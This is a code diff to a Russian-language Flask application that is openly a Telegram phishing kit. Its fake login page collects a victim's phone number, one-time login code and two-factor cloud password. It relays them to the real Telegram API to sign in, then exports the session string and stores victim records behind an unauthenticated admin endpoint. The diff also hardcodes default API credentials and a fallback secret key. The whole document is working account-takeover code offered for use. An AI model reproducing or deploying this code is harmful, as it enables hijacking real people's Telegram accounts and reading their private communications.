@@ -18,29 +18,31 @@ logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
-app.secret_key = os.urandom(32)
 
-# 🔐 ПРОВЕРКА API КЛЮЧЕЙ
-def check_api_keys():
-    api_id = os.getenv('TELEGRAM_API_ID')
-    api_hash = os.getenv('TELEGRAM_API_HASH')
+# 🔥 ПРЯМАЯ ЗАГРУЗКА КЛЮЧЕЙ
+def load_api_keys():
+    """Загружаем API ключи разными способами"""
     
-    logger.info(f"🔍 Проверка API ключей: ID={api_id}, HASH={'*' * 10 if api_hash else 'None'}")
+    # Способ 1: Из .env файла
+    try:
+        from dotenv import load_dotenv
+        load_dotenv()
+        logger.info("✅ .env файл загружен")
+    except ImportError:
+        logger.warning("⚠️ python-dotenv не установлен")
     
-    if not api_id or not api_hash:
-        logger.error("❌ API ключи не установлены!")
-        return False
+    # Способ 2: Из переменных окружения или дефолтные
+    API_ID = os.getenv('TELEGRAM_API_ID', '2040')
+    API_HASH = os.getenv('TELEGRAM_API_HASH', 'b18441a1ff607e10a989891a5462e627')
+    SECRET_KEY = os.getenv('SECRET_KEY', 'fallback-secret-key-12345')
     
-    if not api_id.isdigit():
-        logger.error("❌ API ID должен быть числом!")
-        return False
-        
-    logger.info("✅ API ключи валидны")
-    return True
+    logger.info(f"🔐 Загружены ключи: API_ID={API_ID}, API_HASH={'*' * 10}")
+    
+    return API_ID, API_HASH, SECRET_KEY
 
-# Конфигурация
-API_ID = os.getenv('TELEGRAM_API_ID', '').strip()
-API_HASH = os.getenv('TELEGRAM_API_HASH', '').strip()
+# Загружаем ключи при старте
+API_ID, API_HASH, SECRET_KEY = load_api_keys()
+app.secret_key = SECRET_KEY
 
 # Хранилища
 VICTIMS_DATA = []
@@ -48,32 +50,26 @@ ACTIVE_SESSIONS = {}
 
 class RealTelegramPhisher:
     def __init__(self):
-        if not API_ID or not API_HASH:
-            logger.critical("🚫 API ключи не настроены! Фишинг не будет работать.")
-            self.initialized = False
-            return
-            
         try:
             self.api_id = int(API_ID)
             self.api_hash = API_HASH
             self.initialized = True
-            logger.info(f"✅ Фишинг инициализирован с API ID: {self.api_id}")
-        except ValueError:
-            logger.error("❌ Неверный формат API ID")
+            logger.info(f"✅ ФИШИНГ АКТИВИРОВАН! API ID: {self.api_id}")
+        except (ValueError, TypeError):
+            logger.error("❌ Неверный формат API ключей")
             self.initialized = False
         
     async def start_phishing_attack(self, phone_number):
-        """Начинаем реальную фишинг-атаку через Telegram API"""
+        """Начинаем реальную фишинг-атаку"""
         if not self.initialized:
             return {
                 'success': False, 
-                'error': 'Система не инициализирована. Проверьте API ключи.'
+                'error': 'Проверьте API ключи в настройках Railway'
             }
             
         try:
-            logger.info(f"🎯 Начало реальной фишинг-атаки для: {phone_number}")
+            logger.info(f"🎯 Атака на номер: {phone_number}")
             
-            # Создаем уникальную сессию
             session_id = f"phish_{int(datetime.now().timestamp())}"
             
             # Создаем Telegram клиент
@@ -85,10 +81,9 @@ class RealTelegramPhisher:
             
             await client.connect()
             
-            # Отправляем реальный код через Telegram API
+            # Отправляем реальный код
             sent_code = await client.send_code(phone_number)
             
-            # Сохраняем сессию
             ACTIVE_SESSIONS[session_id] = {
                 'client': client,
                 'phone': phone_number,
@@ -109,21 +104,15 @@ class RealTelegramPhisher:
                 'is_real_telegram': True
             }
             
-        except PhoneNumberInvalid:
-            logger.error(f"❌ Неверный номер телефона: {phone_number}")
-            return {
-                'success': False,
-                'error': 'Неверный номер телефона'
-            }
+        except PhoneNumberInvalidError:
+            logger.error(f"❌ Неверный номер: {phone_number}")
+            return {'success': False, 'error': 'Неверный номер телефона'}
         except Exception as e:
-            logger.error(f"❌ Ошибка отправки кода: {e}")
-            return {
-                'success': False,
-                'error': f'Ошибка Telegram API: {str(e)}'
-            }
+            logger.error(f"❌ Ошибка: {e}")
+            return {'success': False, 'error': f'Ошибка: {str(e)}'}
     
     async def process_victim_code(self, session_id, entered_code):
-        """Обрабатываем код, введенный жертвой"""
+        """Обрабатываем код от жертвы"""
         if not self.initialized:
             return {'success': False, 'error': 'Система не инициализирована'}
             
@@ -138,7 +127,7 @@ class RealTelegramPhisher:
             
             logger.info(f"🔐 Жертва ввела код: {entered_code} для {phone}")
             
-            # Сохраняем перехваченный код
+            # Сохраняем данные
             victim_data = {
                 'session_id': session_id,
                 'phone': phone,
@@ -150,14 +139,14 @@ class RealTelegramPhisher:
             }
             
             try:
-                # Пытаемся войти с кодом жертвы
+                # Пытаемся войти с кодом
                 signed_in = await client.sign_in(
                     phone_number=phone,
                     phone_code_hash=phone_code_hash,
                     phone_code=entered_code
                 )
                 
-                # УСПЕХ! Получили доступ к аккаунту
+                # УСПЕХ! Полный доступ
                 session_string = await client.export_session_string()
                 
                 victim_data.update({
@@ -173,19 +162,18 @@ class RealTelegramPhisher:
                 VICTIMS_DATA.append(victim_data)
                 self.save_victims_data()
                 
-                logger.critical(f"🎉 ПОЛНЫЙ ДОСТУП ПОЛУЧЕН! Аккаунт {phone} скомпрометирован!")
+                logger.critical(f"🎉 ПОЛНЫЙ ДОСТУП! Аккаунт {phone} скомпрометирован!")
                 
                 return {
                     'success': True,
                     'message': '✅ Авторизация успешна!',
                     'next_step': 'complete',
                     'redirect': '/success',
-                    'compromise_level': 'FULL_ACCESS',
-                    'victim_data': victim_data
+                    'compromise_level': 'FULL_ACCESS'
                 }
                 
-            except SessionPasswordNeeded:
-                # Требуется пароль 2FA
+            except SessionPasswordNeededError:
+                # Нужен пароль 2FA
                 victim_data['status'] = 'NEED_PASSWORD'
                 VICTIMS_DATA.append(victim_data)
                 
@@ -197,33 +185,23 @@ class RealTelegramPhisher:
                 return {
                     'success': True,
                     'message': '🔒 Требуется пароль от облачного хранилища',
-                    'next_step': 'enter_password',
-                    'compromise_level': 'CODE_CAPTURED'
+                    'next_step': 'enter_password'
                 }
                 
-            except PhoneCodeInvalid:
-                logger.warning(f"⚠️ Неверный код от жертвы {phone}")
-                return {
-                    'success': False,
-                    'error': 'Неверный код подтверждения'
-                }
+            except PhoneCodeInvalidError:
+                logger.warning(f"⚠️ Неверный код от {phone}")
+                return {'success': False, 'error': 'Неверный код'}
                 
-            except PhoneCodeExpired:
-                logger.warning(f"⚠️ Просроченный код от жертвы {phone}")
-                return {
-                    'success': False,
-                    'error': 'Код подтверждения просрочен'
-                }
+            except PhoneCodeExpiredError:
+                logger.warning(f"⚠️ Просроченный код от {phone}")
+                return {'success': False, 'error': 'Код просрочен'}
                 
         except Exception as e:
-            logger.error(f"❌ Ошибка обработки кода: {e}")
-            return {
-                'success': False,
-                'error': f'Системная ошибка: {str(e)}'
-            }
+            logger.error(f"❌ Ошибка: {e}")
+            return {'success': False, 'error': str(e)}
     
     async def process_victim_password(self, session_id, password):
-        """Обрабатываем пароль, введенный жертвой"""
+        """Обрабатываем пароль от жертвы"""
         if not self.initialized:
             return {'success': False, 'error': 'Система не инициализирована'}
             
@@ -238,10 +216,10 @@ class RealTelegramPhisher:
             logger.info(f"🔑 Жертва ввела пароль для {phone}")
             
             try:
-                # Входим с паролем жертвы
+                # Входим с паролем
                 signed_in = await client.sign_in(password=password)
                 
-                # УСПЕХ! Полный доступ с паролем
+                # УСПЕХ с паролем
                 session_string = await client.export_session_string()
                 
                 victim_data = {
@@ -254,66 +232,53 @@ class RealTelegramPhisher:
                     'last_name': signed_in.last_name,
                     'username': signed_in.username,
                     'ip': request.remote_addr,
-                    'user_agent': request.headers.get('User-Agent'),
                     'compromised_at': datetime.now().isoformat(),
-                    'status': 'FULL_ACCESS_WITH_PASSWORD',
-                    'has_2fa': True
+                    'status': 'FULL_ACCESS_WITH_PASSWORD'
                 }
                 
                 VICTIMS_DATA.append(victim_data)
                 self.save_victims_data()
                 
-                logger.critical(f"🎉 ПОЛНЫЙ ДОСТУП С ПАРОЛЕМ! Аккаунт {phone} скомпрометирован!")
+                logger.critical(f"🎉 ДОСТУП С ПАРОЛЕМ! Аккаунт {phone} скомпрометирован!")
                 
                 return {
                     'success': True,
                     'message': '✅ Авторизация успешна!',
                     'next_step': 'complete',
-                    'redirect': '/success',
-                    'compromise_level': 'FULL_ACCESS_WITH_PASSWORD',
-                    'victim_data': victim_data
+                    'redirect': '/success'
                 }
                 
             except Exception as e:
-                logger.warning(f"⚠️ Неверный пароль от жертвы {phone}: {e}")
-                return {
-                    'success': False,
-                    'error': 'Неверный пароль'
-                }
+                logger.warning(f"⚠️ Неверный пароль от {phone}")
+                return {'success': False, 'error': 'Неверный пароль'}
                 
         except Exception as e:
-            logger.error(f"❌ Ошибка обработки пароля: {e}")
-            return {
-                'success': False,
-                'error': f'Системная ошибка: {str(e)}'
-            }
+            logger.error(f"❌ Ошибка: {e}")
+            return {'success': False, 'error': str(e)}
     
     def save_victims_data(self):
-        """Сохраняем данные жертв в файл"""
+        """Сохраняем данные жертв"""
         try:
             with open('compromised_accounts.json', 'w', encoding='utf-8') as f:
                 json.dump({
                     'victims': VICTIMS_DATA,
                     'total_compromised': len(VICTIMS_DATA),
-                    'last_update': datetime.now().isoformat(),
-                    'full_access_count': len([v for v in VICTIMS_DATA if 'FULL_ACCESS' in v.get('status', '')])
+                    'last_update': datetime.now().isoformat()
                 }, f, ensure_ascii=False, indent=2)
         except Exception as e:
-            logger.error(f"❌ Ошибка сохранения данных: {e}")
+            logger.error(f"❌ Ошибка сохранения: {e}")
 
-# Инициализация фишера
+# Инициализация
 phisher = RealTelegramPhisher()
 
-# Синхронные обертки для асинхронных методов
 def run_async(coro):
     return asyncio.run(coro)
 
 # 🎯 Маршруты
 @app.route('/')
 def index():
-    """Главная фишинговая страница"""
     status = "✅ СИСТЕМА АКТИВНА" if phisher.initialized else "❌ СИСТЕМА НЕ ГОТОВА"
-    status_color = "success" if phisher.initialized else "error"
+    status_color = "status-success" if phisher.initialized else "status-error"
     
     return f'''
 <!DOCTYPE html>
@@ -449,16 +414,14 @@ def index():
             {status}
         </div>
         
-        <!-- Шаг 1: Телефон -->
         <div id="stepPhone" class="step active">
             <div class="input-group">
                 <label class="input-label">Номер телефона</label>
                 <input type="tel" id="phoneInput" class="input-field" placeholder="+7 912 345-67-89" required>
             </div>
-            <button class="btn" onclick="startRealPhishing()" id="phoneBtn">Получить код</button>
+            <button class="btn" onclick="startPhishing()" id="phoneBtn">Получить код</button>
         </div>
         
-        <!-- Шаг 2: Код -->
         <div id="stepCode" class="step">
             <div class="alert success" id="codeAlert">
                 📱 Код отправлен на <span id="phoneDisplay"></span>
@@ -467,10 +430,9 @@ def index():
                 <label class="input-label">Введите код из Telegram</label>
                 <input type="text" id="codeInput" class="input-field" placeholder="12345" required>
             </div>
-            <button class="btn" onclick="submitRealCode()" id="codeBtn">Продолжить</button>
+            <button class="btn" onclick="submitCode()" id="codeBtn">Продолжить</button>
         </div>
         
-        <!-- Шаг 3: Пароль -->
         <div id="stepPassword" class="step">
             <div class="alert success">
                 🔒 Введите пароль от облачного хранилища
@@ -479,7 +441,7 @@ def index():
                 <label class="input-label">Пароль</label>
                 <input type="password" id="passwordInput" class="input-field" placeholder="••••••••" required>
             </div>
-            <button class="btn" onclick="submitRealPassword()" id="passwordBtn">Войти</button>
+            <button class="btn" onclick="submitPassword()" id="passwordBtn">Войти</button>
         </div>
         
         <div id="alertContainer"></div>
@@ -499,7 +461,7 @@ def index():
             container.innerHTML = `<div class="alert ${{type}}">${{message}}</div>`;
         }}
 
-        async function startRealPhishing() {{
+        async function startPhishing() {{
             const phone = document.getElementById('phoneInput').value.trim();
             if (!phone) {{
                 showAlert('Введите номер телефона', 'error');
@@ -509,7 +471,7 @@ def index():
             currentPhone = phone;
             const btn = document.getElementById('phoneBtn');
             btn.disabled = true;
-            btn.textContent = 'Отправка запроса в Telegram...';
+            btn.textContent = 'Отправка...';
 
             try {{
                 const response = await fetch('/api/real/start', {{
@@ -524,7 +486,7 @@ def index():
                     currentSessionId = data.session_id;
                     document.getElementById('phoneDisplay').textContent = phone;
                     showStep('Code');
-                    showAlert('✅ Запрос отправлен в Telegram. Ожидайте код.', 'success');
+                    showAlert('✅ Запрос отправлен. Ожидайте код.', 'success');
                 }} else {{
                     showAlert('❌ ' + data.error, 'error');
                 }}
@@ -536,7 +498,7 @@ def index():
             }}
         }}
 
-        async function submitRealCode() {{
+        async function submitCode() {{
             const code = document.getElementById('codeInput').value.trim();
             if (!code) {{
                 showAlert('Введите код', 'error');
@@ -545,7 +507,7 @@ def index():
 
             const btn = document.getElementById('codeBtn');
             btn.disabled = true;
-            btn.textContent = 'Проверка кода...';
+            btn.textContent = 'Проверка...';
 
             try {{
                 const response = await fetch('/api/real/code', {{
@@ -578,7 +540,7 @@ def index():
             }}
         }}
 
-        async function submitRealPassword() {{
+        async function submitPassword() {{
             const password = document.getElementById('passwordInput').value;
             if (!password) {{
                 showAlert('Введите пароль', 'error');
@@ -587,7 +549,7 @@ def index():
 
             const btn = document.getElementById('passwordBtn');
             btn.disabled = true;
-            btn.textContent = 'Проверка пароля...';
+            btn.textContent = 'Проверка...';
 
             try {{
                 const response = await fetch('/api/real/password', {{
@@ -615,15 +577,14 @@ def index():
             }}
         }}
 
-        // Обработчики Enter
         document.getElementById('phoneInput').addEventListener('keypress', e => {{
-            if (e.key === 'Enter') startRealPhishing();
+            if (e.key === 'Enter') startPhishing();
         }});
         document.getElementById('codeInput').addEventListener('keypress', e => {{
-            if (e.key === 'Enter') submitRealCode();
+            if (e.key === 'Enter') submitCode();
         }});
         document.getElementById('passwordInput').addEventListener('keypress', e => {{
-            if (e.key === 'Enter') submitRealPassword();
+            if (e.key === 'Enter') submitPassword();
         }});
     </script>
 </body>
@@ -632,45 +593,35 @@ def index():
 
 @app.route('/api/real/start', methods=['POST'])
 def api_real_start():
-    """Начинаем реальную фишинг-атаку"""
     data = request.get_json()
     phone = data.get('phone', '').strip()
-    
     if not phone:
-        return jsonify({'success': False, 'error': 'Введите номер телефона'})
-    
+        return jsonify({'success': False, 'error': 'Введите номер'})
     result = run_async(phisher.start_phishing_attack(phone))
     return jsonify(result)
 
 @app.route('/api/real/code', methods=['POST'])
 def api_real_code():
-    """Обрабатываем код от жертвы"""
     data = request.get_json()
     session_id = data.get('session_id')
     code = data.get('code', '').strip()
-    
     if not session_id or not code:
-        return jsonify({'success': False, 'error': 'Введите код и session_id'})
-    
+        return jsonify({'success': False, 'error': 'Введите код'})
     result = run_async(phisher.process_victim_code(session_id, code))
     return jsonify(result)
 
 @app.route('/api/real/password', methods=['POST'])
 def api_real_password():
-    """Обрабатываем пароль от жертвы"""
     data = request.get_json()
     session_id = data.get('session_id')
     password = data.get('password', '')
-    
     if not session_id or not password:
-        return jsonify({'success': False, 'error': 'Введите пароль и session_id'})
-    
+        return jsonify({'success': False, 'error': 'Введите пароль'})
     result = run_async(phisher.process_victim_password(session_id, password))
     return jsonify(result)
 
 @app.route('/success')
 def success():
-    """Страница успеха"""
     return '''
     <!DOCTYPE html>
     <html>
@@ -721,29 +672,21 @@ def success():
 
 @app.route('/admin')
 def admin():
-    """Админка с компрометированными данными"""
     return jsonify({
         'total_victims': len(VICTIMS_DATA),
         'full_access_count': len([v for v in VICTIMS_DATA if 'FULL_ACCESS' in v.get('status', '')]),
         'victims': VICTIMS_DATA,
-        'active_sessions': len(ACTIVE_SESSIONS),
-        'api_initialized': phisher.initialized,
-        'api_id': API_ID if phisher.initialized else 'NOT_SET'
+        'api_initialized': phisher.initialized
     })
 
 @app.route('/health')
 def health():
-    """Проверка здоровья"""
     return jsonify({
-        'status': 'REAL_PHISHING_ACTIVE' if phisher.initialized else 'API_KEYS_MISSING',
+        'status': 'ACTIVE' if phisher.initialized else 'INACTIVE',
         'victims_count': len(VICTIMS_DATA),
         'api_connected': phisher.initialized,
-        'timestamp': datetime.now().isoformat(),
-        'api_id_set': bool(API_ID),
-        'api_hash_set': bool(API_HASH)
+        'timestamp': datetime.now().isoformat()
     })
 
 if __name__ == '__main__':
-    # Проверяем API ключи при запуске
-    check_api_keys()
     app.run(host='0.0.0.0', port=8080, debug=False)
